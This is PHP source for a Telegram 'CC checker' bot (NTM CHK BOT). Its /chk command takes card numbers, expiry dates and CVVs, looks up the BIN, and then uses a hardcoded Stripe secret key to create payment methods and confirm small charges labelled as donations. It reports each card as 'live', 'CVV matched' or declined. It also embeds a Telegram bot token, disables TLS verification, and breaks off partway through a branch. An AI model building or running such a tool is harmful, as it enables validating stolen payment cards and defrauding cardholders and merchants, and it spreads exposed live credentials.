<?php

////////////////=============[NTM CHK BOT]=============////////////////
$botToken = "6205064305:AAEEhoyi29L33iOMLjmVc3yf8P6qfO7Le3I"; // Enter ur bot token
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$lastname = $update["message"]["from"]["last_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];
$premiums = file_get_contents('users.txt');
$premium = explode("\n", $premiums);
$group = file_get_contents('groups.txt');
$groups = explode("\n", $group);
if($userId == '5136746907') {
$usernam = ''.$username.' 『 𝘿𝙀𝙑 』';
}
elseif($userId == '1438079488') {
        $usernam = ''.$username. ' 『 𝘾𝙤-𝙊𝙬𝙣𝙚𝙧 』';
}
elseif($userId == '599032965') {
        $usernam = ''.$username. ' 『 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 』';
}
elseif($userId == '5136746907') {
        $usernam = ''.$username. ' 『 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 』';
}
elseif($userId == '5208953138') {
        $usernam = ''.$username. ' 『 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 』';
}
elseif($userId == '5235254084') {
        $usernam = ''.$username. ' 『 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 』';
}
elseif($userId == '1456981856') {
        $usernam = ''.$username. ' 『 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 』';
}
elseif($userId == '1055691797') {
        $usernam = ''.$username. ' 『 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 』';
}
elseif($userId == '902490353') {
        $usernam = ''.$username. ' 『 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 』';
}
elseif($userId == '1670892844') {
        $usernam = ''.$username. ' 『 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 』';
}
elseif($userId == '1086782226') {
        $usernam = ''.$username. ' 『 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 』';
}
elseif($userId == '5537151587') {
        $usernam = ''.$username. ' 『 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 』';
}
elseif($userId == '1167297260') {
        $usernam = ''.$username. ' 『 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 』';
}
elseif($userId == '1806811191') {
        $usernam = ''.$username. ' 『 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 』';
}
elseif($userId == '1395583035') {
        $usernam = ''.$username. ' 『 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 』';
}
elseif($userId == '1693753708') {
        $usernam = ''.$username. ' 『 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 』';
}
elseif($userId == '1614204503') {
        $usernam = ''.$username. ' 『 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 』';
}
elseif($userId == '601061568') {
        $usernam = ''.$username. ' 『 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 』';
}
elseif($userId == '1925321421') {
        $usernam = ''.$username. ' 『 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 』';
}
elseif($userId == '2127918816') {
        $usernam = ''.$username. ' 『 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 』';
}
elseif($userId == '1120329919') {
        $usernam = ''.$username. ' 『 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 』';
}
elseif($userId == '1020896203') {
        $usernam = ''.$username. ' 『 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 』';
}
elseif($userId == '1925321421') {
        $usernam = ''.$username. ' 『 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 』';
}
elseif($userId == '5342338593') {
        $usernam = ''.$username. ' 『 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 』';
}
elseif($userId == '1245824051') {
        $usernam = ''.$username. ' 『 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 』';
}
elseif($userId == '566648395') {
        $usernam = ''.$username. ' 『 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 』';
}
elseif($userId == '5252502378') {
        $usernam = ''.$username. ' 『 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 』';
}
elseif($userId == '5360410436') {
        $usernam = ''.$username. ' 『 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 』';
}
else {
$usernam = $username. ' 『 𝙁𝙍𝙀𝙀 』';
}
$sk=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;
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
function random_strings($length_of_string) 
{
    $str_result = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; 
    return substr(str_shuffle($str_result),  
                       0, $length_of_string); 
}
$mail = '【🅽🆃🅼】mittal'.random_strings(6).'';
//////////=========[Start Command]=========//////////


if ((strpos($message, "/info") === 0)||(strpos($message, "!start") === 0)||(strpos($message, "!id") === 0)||(strpos($message, "!info") === 0)||(strpos($message, "/id") === 0)||(strpos($message, "/me") === 0)||(strpos($message, "/start") === 0)){
        sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐈𝐃 ➣</b> <code>$userId</code>%0A<b>╟══════════════════════════%0A╟➣𝐆𝐫𝐨𝐮𝐩 𝐈𝐃 ➣ </b><code>$chatId</code>%0A<b>╟══════════════════════════%0A╟➣ 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞 ➣</b> @$usernam%0A<b>╟══════════════════════════%0A╟➣𝐓𝐨 𝐊𝐧𝐨𝐰 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬 ➣ /cmds%0A╚══════════════════════════</b>", $message_id);
        }
        elseif ((strpos($message, "!pre") === 0)||(strpos($message, "/pre") === 0)){
        if($userId == '803003146'|'1087442527') {
        $addpremium = substr($message, 6);
        fwrite(fopen('users.txt', 'a'), $addpremium."\r\n");
        sendMessage($chatId, "<b>Successfully added $addpremium to premium user</b>", $message_id);
        }
                
        else {
        sendMessage($chatId, "<b>You Can't  Add Users Ask %0A@abdul97233 To Add You  </b>", $message_id);
        }
        }
                
        elseif ((strpos($message, "!group") === 0)||(strpos($message, "/group") === 0)){
        if($userId == '803003146') {
        $addgroup = substr($message, 7);
        fwrite(fopen('groups.txt', 'a'), $addgroup."\r\n");
        sendMessage($chatId, "<b>Successfully added $addgroup to Authorised Groups</b>", $message_id);
        }
                
        else {
        sendMessage($chatId, "<b>You Can't  Add Groups, Ask %0A@abdul97233 To Add Your Group</b>", $message_id);
        }
        }
        elseif ((strpos($message, "/chk") === 0)||(strpos($message, "!chk") === 0)||(strpos($message, "!ch") === 0)||(strpos($message, "/ch") === 0)||(strpos($message, ".ch") === 0)||(strpos($message, "!usd") === 0)||(strpos($message, "/usd") === 0)||(strpos($message, ".usd") === 0)||(strpos($message, ".chk") === 0)){
        $message = substr($message, 4);
        $amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
        $cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
        $mes = multiexplode(array(":", "/", " ", "|"), $message)[2];
        $ano = multiexplode(array(":", "/", " ", "|"), $message)[3];
        $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
        if (empty($amt)) {
        $amt = '1';
        }
                $amount = $amt * 100;
                $lista = ''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'';
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
                curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Host: lookup.binlist.net',
                'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, '');
                $fim = curl_exec($ch);
                $bank = GetStr($fim, '"bank":{"name":"', '"');
                $name = GetStr($fim, '"name":"', '"');
                $brand = GetStr($fim, '"brand":"', '"');
                $country = GetStr($fim, '"country":{"name":"', '"');
                $emoji = GetStr($fim, '"emoji":"', '"');
                $scheme = GetStr($fim, '"scheme":"', '"');
                $info = curl_getinfo($ch);
                $time = $info['total_time'];
                $httpCode = $info['http_code'];
                 $time = substr($time, 0, 4);
                $type = GetStr($fim, '"type":"', '"');
                if(strpos($fim, '"type":"credit"') !== false){
                $bin = 'Credit';
                }else{
                $bin = 'Debit';
                };
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&billing_details[address][line1]=36&billing_details[address][line2]=Regent Street&billing_details[address][city]=Jamestown&billing_details[address][postal_code]=14701&billing_details[address][state]=New York&billing_details[address][country]=US&billing_details[email]='.$mail.'@gmail.com&billing_details[name]=【🅽🆃🅼】@NTMchat Mittal');
                $result1 = curl_exec($ch);
                $tok1 = Getstr($result1,'"id": "','"');
                $msg1 = Getstr($result1,'"message": "','"');
                $ch = curl_init();
                $info = curl_getinfo($ch);
                $time = $info['total_time'];
                $httpCode = $info['http_code'];
                 $time = substr($time, 0, 4);
                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amount.'&currency=usd&payment_method_types[]=card&description=【🅽🆃🅼】@NTMchat Donation&payment_method='.$tok1.'&confirm=true&off_session=true');
                $result2 = curl_exec($ch);
                $info = curl_getinfo($ch);
                $time = $info['total_time'];
                $httpCode = $info['http_code'];
                 $time = substr($time, 0, 4);
                $msg2 = Getstr($result2,'"message": "','"');
                $rcp = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));
                if(strpos($result2, '"seller_message": "Payment complete."' )) {
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣ 『 ★ CVV MATCHED ✅ ★ 』</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣ Charged $$amt ✅</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
        
                }
                elseif(strpos($result2, "insufficient_funds" )) {
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  『 ★ CVV MATCHED ✅ ★ 』</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Insufficient Funds</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme %0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "<b>𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  『 ★ CVV MATCHED ✅ ★ 』</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  3D 𝘾𝙖𝙧𝙙</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme %0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A╟═══════════════════%0A╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣ <b>'.$time.'s</b>%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif(strpos($result2,'"cvc_check": "pass"')){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  『 ★ CVV MATCHED ✅ ★ 』</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Payment Cannot Be Completed</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme %0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif(strpos($result2,'"code": "incorrect_cvc"')){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  『 ★ CCN LIVE ✅ ★ 』</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Charged $$amt ✅</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt</b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme %0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif(strpos($result1,'"code": "incorrect_cvc"')){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  『 ★ CCN LIVE ✅ ★ </b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Charged $$amt ✅</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme %0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, "transaction_not_allowed")) || (strpos($result2, "transaction_not_allowed"))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  『 ★ CVV MATCHED ✅ ★ 』</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Transaction Not Allowed</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt</b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme %0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, "fraudulent")) || (strpos($result2, "fraudulent"))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  Fraudulent</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme %0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, "expired_card")) || (strpos($result2, "expired_card"))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  Expired 𝘾𝙖𝙧𝙙</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme %0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, "generic_declined")) || (strpos($result2, "generic_declined"))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  Generic Declined</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme %0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
                }
                elseif ((strpos($result1, "do_not_honor")) || (strpos($result2, "do_not_honor"))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  Do Not Honor</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme %0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, 'rate_limit')) || (strpos($result2, 'rate_limit'))){
